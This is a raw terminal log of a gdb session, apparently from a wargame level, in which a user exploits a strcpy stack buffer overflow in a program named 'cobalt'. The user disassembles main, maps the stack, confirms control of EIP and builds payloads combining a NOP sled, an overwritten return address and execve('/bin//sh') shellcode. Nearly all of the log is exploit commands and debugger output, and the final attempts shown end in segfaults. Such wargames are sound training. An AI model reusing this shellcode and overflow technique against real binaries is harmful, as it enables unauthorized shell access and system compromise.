0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x10,%esp
0x8048436 <main+6>:	cmpl   $0x1,0x8(%ebp)
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   $0x80484d0
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    $0x4,%esp
0x8048449 <main+25>:	push   $0x0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    $0x4,%esp
0x8048453 <main+35>:	mov    0xc(%ebp),%eax
0x8048456 <main+38>:	add    $0x4,%eax
0x8048459 <main+41>:	mov    (%eax),%edx
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    0xfffffff0(%ebp),%eax
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    $0x8,%esp
0x8048468 <main+56>:	lea    0xfffffff0(%ebp),%eax
0x804846b <main+59>:	push   %eax
0x804846c <main+60>:	push   $0x80484dc
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    $0x8,%esp
0x8048479 <main+73>:	leave  
0x804847a <main+74>:	ret    
0x804847b <main+75>:	nop    
0x804847c <main+76>:	nop    
0x804847d <main+77>:	nop    
0x804847e <main+78>:	nop    
0x804847f <main+79>:	nop    
End of assembler dump.
(gdb) 
Dump of assembler code for function main:
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x10,%esp
0x8048436 <main+6>:	cmpl   $0x1,0x8(%ebp)
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   $0x80484d0
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    $0x4,%esp
0x8048449 <main+25>:	push   $0x0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    $0x4,%esp
0x8048453 <main+35>:	mov    0xc(%ebp),%eax
0x8048456 <main+38>:	add    $0x4,%eax
0x8048459 <main+41>:	mov    (%eax),%edx
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    0xfffffff0(%ebp),%eax
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    $0x8,%esp
0x8048468 <main+56>:	lea    0xfffffff0(%ebp),%eax
0x804846b <main+59>:	push   %eax
0x804846c <main+60>:	push   $0x80484dc
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    $0x8,%esp
0x8048479 <main+73>:	leave  
0x804847a <main+74>:	ret    
0x804847b <main+75>:	nop    
0x804847c <main+76>:	nop    
0x804847d <main+77>:	nop    
0x804847e <main+78>:	nop    
0x804847f <main+79>:	nop    
End of assembler dump.
(gdb) b main+53
Junk at end of arguments.
(gdb) b i 
Function "i" not defined.
(gdb) b info
Function "info" not defined.
(gdb) b
No default breakpoint address now.
(gdb) b *main+53
Breakpoint 1 at 0x8048465
(gdb) b
No default breakpoint address now.
(gdb) b in
Function "in" not defined.
(gdb) info b
Num Type           Disp Enb Address    What
1   breakpoint     keep y   0x08048465  <main+53>
(gdb) r `python -c 'print"AB"*8'`
Starting program: /home/gremlin/cobalt `python -c 'print"AB"*8'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb10:	0xbffffb18	0xbffffc7c	0x42414241	0x42414241
0xbffffb20:	0x42414241	0x42414241	0xbffffb00	0x400309cb
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc67	0xbffffc7c	0x00000000
0xbffffb80:	0xbffffc8d	0xbffffcaf	0xbffffcb9	0xbffffcc7
0xbffffb90:	0xbffffce6	0xbffffcf6	0xbffffd0e	0xbffffd2b
0xbffffba0:	0xbffffd36	0xbffffd44	0xbffffd87	0xbffffd9a
0xbffffbb0:	0xbffffdaf	0xbffffdbf	0xbffffdcc	0xbffffdeb
0xbffffbc0:	0xbffffe04	0xbffffe0f	0xbffffe1c	0xbffffe24
0xbffffbd0:	0x00000000	0x00000003
(gdb) 
0xbffffbd8:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffbe8:	0x00000006	0x00000006	0x00001000	0x00000007
0xbffffbf8:	0x40000000	0x00000008	0x00000000	0x00000009
0xbffffc08:	0x08048380	0x0000000b	0x000001f5	0x0000000c
0xbffffc18:	0x000001f5	0x0000000d	0x000001f5	0x0000000e
0xbffffc28:	0x000001f5	0x00000010	0x0fabfbff	0x0000000f
0xbffffc38:	0xbffffc62	0x00000000	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc58:	0x00000000	0x00000000	0x36690000	0x2f003638
0xbffffc68:	0x656d6f68	0x6572672f	0x6e696c6d	0x626f632f
0xbffffc78:	0x00746c61	0x42414241	0x42414241	0x42414241
0xbffffc88:	0x42414241	0x53454c00	0x45504f53	0x2f7c3d4e
0xbffffc98:	0x2f727375	0x2f6e6962
(gdb) r `python -c 'print"AB"*9'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print"AB"*9'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb10:	0xbffffb18	0xbffffc7a	0x42414241	0x42414241
0xbffffb20:	0x42414241	0x42414241	0xbf004241	0x400309cb
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc65	0xbffffc7a	0x00000000
0xbffffb80:	0xbffffc8d	0xbffffcaf	0xbffffcb9	0xbffffcc7
0xbffffb90:	0xbffffce6	0xbffffcf6	0xbffffd0e	0xbffffd2b
0xbffffba0:	0xbffffd36	0xbffffd44	0xbffffd87	0xbffffd9a
0xbffffbb0:	0xbffffdaf	0xbffffdbf	0xbffffdcc	0xbffffdeb
0xbffffbc0:	0xbffffe04	0xbffffe0f	0xbffffe1c	0xbffffe24
0xbffffbd0:	0x00000000	0x00000003
(gdb) r `python -c 'print"AB"*10'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print"AB"*10'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb00:	0xbffffb08	0xbffffc78	0x42414241	0x42414241
0xbffffb10:	0x42414241	0x42414241	0x42414241	0x40030900
0xbffffb20:	0x00000002	0xbffffb64	0xbffffb70	0x40013868
0xbffffb30:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb40:	0x08048430	0x00000002	0xbffffb64	0x080482e0
0xbffffb50:	0x080484ac	0x4000ae60	0xbffffb5c	0x40013e90
0xbffffb60:	0x00000002	0xbffffc63	0xbffffc78	0x00000000
0xbffffb70:	0xbffffc8d	0xbffffcaf	0xbffffcb9	0xbffffcc7
0xbffffb80:	0xbffffce6	0xbffffcf6	0xbffffd0e	0xbffffd2b
0xbffffb90:	0xbffffd36	0xbffffd44	0xbffffd87	0xbffffd9a
0xbffffba0:	0xbffffdaf	0xbffffdbf	0xbffffdcc	0xbffffdeb
0xbffffbb0:	0xbffffe04	0xbffffe0f	0xbffffe1c	0xbffffe24
0xbffffbc0:	0x00000000	0x00000003
(gdb) r `python -c 'print"A"*2'`
The program being debugged has been started already.
Start it from the beginning? (y or n) ^[[A^[[B^H^H^H^H^H^H^Hy
Please answer y or n.
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print"A"*2'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb20:	0xbffffb28	0xbffffc8a	0xbf004141	0x0804841b
0xbffffb30:	0x080494ec	0x08049500	0xbffffb58	0x400309cb
0xbffffb40:	0x00000002	0xbffffb84	0xbffffb90	0x40013868
0xbffffb50:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb60:	0x08048430	0x00000002	0xbffffb84	0x080482e0
0xbffffb70:	0x080484ac	0x4000ae60	0xbffffb7c	0x40013e90
0xbffffb80:	0x00000002	0xbffffc75	0xbffffc8a	0x00000000
0xbffffb90:	0xbffffc8d	0xbffffcaf	0xbffffcb9	0xbffffcc7
0xbffffba0:	0xbffffce6	0xbffffcf6	0xbffffd0e	0xbffffd2b
0xbffffbb0:	0xbffffd36	0xbffffd44	0xbffffd87	0xbffffd9a
0xbffffbc0:	0xbffffdaf	0xbffffdbf	0xbffffdcc	0xbffffdeb
0xbffffbd0:	0xbffffe04	0xbffffe0f	0xbffffe1c	0xbffffe24
0xbffffbe0:	0x00000000	0x00000003
(gdb) r `python -c 'print"ABCDEFG"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print"ABCDEFG"'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb10:	0xbffffb18	0xbffffc85	0x44434241	0x00474645
0xbffffb20:	0x080494ec	0x08049500	0xbffffb48	0x400309cb
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc70	0xbffffc85	0x00000000
0xbffffb80:	0xbffffc8d	0xbffffcaf	0xbffffcb9	0xbffffcc7
0xbffffb90:	0xbffffce6	0xbffffcf6	0xbffffd0e	0xbffffd2b
0xbffffba0:	0xbffffd36	0xbffffd44	0xbffffd87	0xbffffd9a
0xbffffbb0:	0xbffffdaf	0xbffffdbf	0xbffffdcc	0xbffffdeb
0xbffffbc0:	0xbffffe04	0xbffffe0f	0xbffffe1c	0xbffffe24
0xbffffbd0:	0x00000000	0x00000003
(gdb) x/50s $esp
0xbffffb10:	 "\03005CDEFG"
0xbffffb20:	 "뚲24\004\b"
0xbffffb25:	 "\225\004\bHʜt\003@\002"
0xbffffb32:	 ""
0xbffffb33:	 ""
0xbffffb34:	 "t00\001@\002"
0xbffffb42:	 ""
0xbffffb43:	 ""
0xbffffb44:	 "\200\203\004\b"
0xbffffb49:	 ""
0xbffffb4a:	 ""
0xbffffb4b:	 ""
0xbffffb4c:	 "¡\203\004\b0\204\004\b\002"
0xbffffb56:	 ""
0xbffffb57:	 ""
0xbffffb58:	 "tߜ202\004\b¬\204\004\b`®"
0xbffffb67:	 "@l20>\001@\002"
0xbffffb72:	 ""
0xbffffb73:	 ""
0xbffffb74:	 "p갰5
0xbffffb7d:	 ""
0xbffffb7e:	 ""
0xbffffb7f:	 ""
0xbffffb80:	 "\215ཿ¿¹轿¿罿¿􏱜016쾿¿6徿¿\207갳2྿¿¿󿲿쾿¿\004þÿ¿\017þÿ¿\034þÿ¿$þÿ¿"
0xbffffbd1:	 ""
0xbffffbd2:	 ""
0xbffffbd3:	 ""
0xbffffbd4:	 "\003"
0xbffffbd6:	 ""
0xbffffbd7:	 ""
0xbffffbd8:	 "4\200\004\b\004"
0xbffffbde:	 ""
0xbffffbdf:	 ""
0xbffffbe0:	 " "
0xbffffbe2:	 ""
0xbffffbe3:	 ""
0xbffffbe4:	 "\005"
0xbffffbe6:	 ""
0xbffffbe7:	 ""
0xbffffbe8:	 "\006"
0xbffffbea:	 ""
0xbffffbeb:	 ""
0xbffffbec:	 "\006"
0xbffffbee:	 ""
0xbffffbef:	 ""
0xbffffbf0:	 ""
---Type <return> to continue, or q <return> to quit---
0xbffffbf1:	 "\020"
0xbffffbf3:	 ""
0xbffffbf4:	 "\a"
0xbffffbf6:	 ""
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) r `python -c 'print"AB"*8'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print"AB"*8'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50s $esp
0xbffffb10:	 "\030ÿ¿ABABABABABABABAB"
0xbffffb29:	 "ʜt\003@\002"
0xbffffb32:	 ""
0xbffffb33:	 ""
0xbffffb34:	 "t00\001@\002"
0xbffffb42:	 ""
0xbffffb43:	 ""
0xbffffb44:	 "\200\203\004\b"
0xbffffb49:	 ""
0xbffffb4a:	 ""
0xbffffb4b:	 ""
0xbffffb4c:	 "¡\203\004\b0\204\004\b\002"
0xbffffb56:	 ""
0xbffffb57:	 ""
0xbffffb58:	 "tߜ202\004\b¬\204\004\b`®"
0xbffffb67:	 "@l20>\001@\002"
0xbffffb72:	 ""
0xbffffb73:	 ""
0xbffffb74:	 "g󯲿"
0xbffffb7d:	 ""
0xbffffb7e:	 ""
0xbffffb7f:	 ""
0xbffffb80:	 "\215ཿ¿¹轿¿罿¿􏱜016쾿¿6徿¿\207갳2྿¿¿󿲿쾿¿\004þÿ¿\017þÿ¿\034þÿ¿$þÿ¿"
0xbffffbd1:	 ""
0xbffffbd2:	 ""
0xbffffbd3:	 ""
0xbffffbd4:	 "\003"
0xbffffbd6:	 ""
0xbffffbd7:	 ""
0xbffffbd8:	 "4\200\004\b\004"
0xbffffbde:	 ""
0xbffffbdf:	 ""
0xbffffbe0:	 " "
0xbffffbe2:	 ""
0xbffffbe3:	 ""
0xbffffbe4:	 "\005"
0xbffffbe6:	 ""
0xbffffbe7:	 ""
0xbffffbe8:	 "\006"
0xbffffbea:	 ""
0xbffffbeb:	 ""
0xbffffbec:	 "\006"
0xbffffbee:	 ""
0xbffffbef:	 ""
0xbffffbf0:	 ""
0xbffffbf1:	 "\020"
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) x/50x $esp
0xbffffb10:	0xbffffb18	0xbffffc7c	0x42414241	0x42414241
0xbffffb20:	0x42414241	0x42414241	0xbffffb00	0x400309cb
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc67	0xbffffc7c	0x00000000
0xbffffb80:	0xbffffc8d	0xbffffcaf	0xbffffcb9	0xbffffcc7
0xbffffb90:	0xbffffce6	0xbffffcf6	0xbffffd0e	0xbffffd2b
0xbffffba0:	0xbffffd36	0xbffffd44	0xbffffd87	0xbffffd9a
0xbffffbb0:	0xbffffdaf	0xbffffdbf	0xbffffdcc	0xbffffdeb
0xbffffbc0:	0xbffffe04	0xbffffe0f	0xbffffe1c	0xbffffe24
0xbffffbd0:	0x00000000	0x00000003
(gdb) r `python -c 'print"ABCDABCDABCDABC"*'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print"ABCDABCDABCDABC"*'`
  File "<string>", line 1
    print"ABCDABCDABCDABC"*
                          ^
SyntaxError: invalid syntax
argv error

Program exited normally.
(gdb) r `python -c 'print"ABCDABCDABCDABC"'`
Starting program: /home/gremlin/cobalt `python -c 'print"ABCDABCDABCDABC"'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50x $esp
0xbffffb10:	0xbffffb18	0xbffffc7d	0x44434241	0x44434241
0xbffffb20:	0x44434241	0x00434241	0xbffffb48	0x400309cb
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc68	0xbffffc7d	0x00000000
0xbffffb80:	0xbffffc8d	0xbffffcaf	0xbffffcb9	0xbffffcc7
0xbffffb90:	0xbffffce6	0xbffffcf6	0xbffffd0e	0xbffffd2b
0xbffffba0:	0xbffffd36	0xbffffd44	0xbffffd87	0xbffffd9a
0xbffffbb0:	0xbffffdaf	0xbffffdbf	0xbffffdcc	0xbffffdeb
0xbffffbc0:	0xbffffe04	0xbffffe0f	0xbffffe1c	0xbffffe24
0xbffffbd0:	0x00000000	0x00000003
(gdb) q
The program is running.  Exit anyway? (y or n) y
[gremlin@localhost gremlin]$ core
bash: core: command not found
[gremlin@localhost gremlin]$ ls  
cobalt  cobolt  cobolt.c  core
[gremlin@localhost gremlin]$ ./cobalt "A"*16+"\x48\xfb\xff\xbf"+"\x34\xfb\xff\xbf"+"\x90"*10+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
A*16+\x48\xfb\xff\xbf+\x34\xfb\xff\xbf+\x90*10+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*16+"\x48\xfb\xff\xbf"+"\x34\xfb\xff\xbf"+"\x90"*10+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAH
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20'`
¿4
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*24'`
¿1￐h//shh/bin⏓ኂ°
                ̀ 
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*24'`
AAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt AAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/50 $esp
0xbffffb30:	0x00000000	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc6c	0xbffffc75	0x00000000
0xbffffb80:	0xbffffc8e	0xbffffcb0	0xbffffcba	0xbffffcc8
0xbffffb90:	0xbffffce7	0xbffffcf7	0xbffffd0f	0xbffffd2c
0xbffffba0:	0xbffffd37	0xbffffd45	0xbffffd88	0xbffffd9b
0xbffffbb0:	0xbffffdb0	0xbffffdc0	0xbffffdcd	0xbffffdec
0xbffffbc0:	0xbffffe05	0xbffffe10	0xbffffe1d	0xbffffe25
0xbffffbd0:	0xbfffffe8	0x00000000	0x00000003	0x08048034
0xbffffbe0:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffffbf0:	0x00000006	0x00001000
(gdb) 
0xbffffbf8:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffc08:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffc18:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffc28:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffc38:	0x0000000f	0xbffffc67	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc58:	0x00000000	0x00000000	0x00000000	0x69000000
0xbffffc68:	0x00363836	0x6f632f2e	0x746c6162	0x41414100
0xbffffc78:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc88:	0x41414141	0x454c0041	0x504f5353	0x7c3d4e45
0xbffffc98:	0x7273752f	0x6e69622f	0x73656c2f	0x70697073
0xbffffca8:	0x68732e65	0x00732520	0x52455355	0x454d414e
0xbffffcb8:	0x4948003d	0x49535453
(gdb) x/50 $espq
Value can't be converted to integer.
(gdb) q
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20'`
AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt AAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x40030902 in ?? ()
(gdb) x/50 $esp
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc5b	0xbffffc79	0x00000000
0xbffffb80:	0xbffffc8e	0xbffffcb0	0xbffffcba	0xbffffcc8
0xbffffb90:	0xbffffce7	0xbffffcf7	0xbffffd0f	0xbffffd2c
0xbffffba0:	0xbffffd37	0xbffffd45	0xbffffd88	0xbffffd9b
0xbffffbb0:	0xbffffdb0	0xbffffdc0	0xbffffdcd	0xbffffdec
0xbffffbc0:	0xbffffe05	0xbffffe10	0xbffffe1d	0xbffffe25
0xbffffbd0:	0xbfffffe8	0x00000000	0x00000003	0x08048034
0xbffffbe0:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffffbf0:	0x00000006	0x00001000
(gdb) 
0xbffffbf8:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffc08:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffc18:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffc28:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffc38:	0x0000000f	0xbffffc6b	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc58:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc68:	0x69000000	0x00363836	0x6f632f2e	0x746c6162
0xbffffc78:	0x41414100	0x41414141	0x41414141	0x41414141
0xbffffc88:	0x41414141	0x454c0041	0x504f5353	0x7c3d4e45
0xbffffc98:	0x7273752f	0x6e69622f	0x73656c2f	0x70697073
0xbffffca8:	0x68732e65	0x00732520	0x52455355	0x454d414e
0xbffffcb8:	0x4948003d	0x49535453
(gdb) q
[gremlin@localhost gremlin]$ ls
cobalt  cobolt  cobolt.c  core
[gremlin@localhost gremlin]$ mkdir tmp
[gremlin@localhost gremlin]$ cp cobalt tmp
[gremlin@localhost gremlin]$ cd tmp  
[gremlin@localhost tmp]$ ls
cobalt
[gremlin@localhost tmp]$ gdb -q cobalt
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x10,%esp
0x8048436 <main+6>:	cmpl   $0x1,0x8(%ebp)
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   $0x80484d0
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    $0x4,%esp
0x8048449 <main+25>:	push   $0x0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    $0x4,%esp
0x8048453 <main+35>:	mov    0xc(%ebp),%eax
0x8048456 <main+38>:	add    $0x4,%eax
0x8048459 <main+41>:	mov    (%eax),%edx
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    0xfffffff0(%ebp),%eax
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    $0x8,%esp
0x8048468 <main+56>:	lea    0xfffffff0(%ebp),%eax
0x804846b <main+59>:	push   %eax
0x804846c <main+60>:	push   $0x80484dc
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    $0x8,%esp
0x8048479 <main+73>:	leave  
0x804847a <main+74>:	ret    
0x804847b <main+75>:	nop    
0x804847c <main+76>:	nop    
0x804847d <main+77>:	nop    
0x804847e <main+78>:	nop    
0x804847f <main+79>:	nop    
End of assembler dump.
(gdb) r `python -c 'print "A"*24'` `python -c 'print "\x90"*1000'`
Starting program: /home/gremlin/tmp/cobalt `python -c 'print "A"*24'` `python -c 'print "\x90"*1000'`
AAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/100x $esp
0xbffff730:	0x00000000	0xbffff774	0xbffff784	0x40013868
0xbffff740:	0x00000003	0x08048380	0x00000000	0x080483a1
0xbffff750:	0x08048430	0x00000003	0xbffff774	0x080482e0
0xbffff760:	0x080484ac	0x4000ae60	0xbffff76c	0x40013e90
0xbffff770:	0x00000003	0xbffff86e	0xbffff887	0xbffff8a0
0xbffff780:	0x00000000	0xbffffc89	0xbffffcab	0xbffffcb5
0xbffff790:	0xbffffcc3	0xbffffce2	0xbffffcf2	0xbffffd0a
0xbffff7a0:	0xbffffd27	0xbffffd32	0xbffffd40	0xbffffd83
0xbffff7b0:	0xbffffd96	0xbffffdab	0xbffffdbb	0xbffffdc8
0xbffff7c0:	0xbffffde7	0xbffffe00	0xbffffe0b	0xbffffe18
0xbffff7d0:	0xbffffe20	0x00000000	0x00000003	0x08048034
0xbffff7e0:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffff7f0:	0x00000006	0x00001000	0x00000007	0x40000000
0xbffff800:	0x00000008	0x00000000	0x00000009	0x08048380
0xbffff810:	0x0000000b	0x000001f5	0x0000000c	0x000001f5
0xbffff820:	0x0000000d	0x000001f5	0x0000000e	0x000001f5
0xbffff830:	0x00000010	0x0fabfbff	0x0000000f	0xbffff869
0xbffff840:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff850:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff860:	0x00000000	0x00000000	0x38366900	0x682f0036
0xbffff870:	0x2f656d6f	0x6d657267	0x2f6e696c	0x2f706d74
0xbffff880:	0x61626f63	0x4100746c	0x41414141	0x41414141
0xbffff890:	0x41414141	0x41414141	0x41414141	0x00414141
0xbffff8a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff8b0:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
0xbffff8c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff8d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff8e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff8f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff900:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff910:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff920:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff930:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff940:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff950:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff960:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff970:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff980:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff990:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa00:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa10:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa20:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa30:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa40:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) q
The program is running.  Exit anyway? (y or n) y
[gremlin@localhost tmp]$ cd ..
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*20+"\x00\xf9\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
> '
> `
 
Segmentation fault
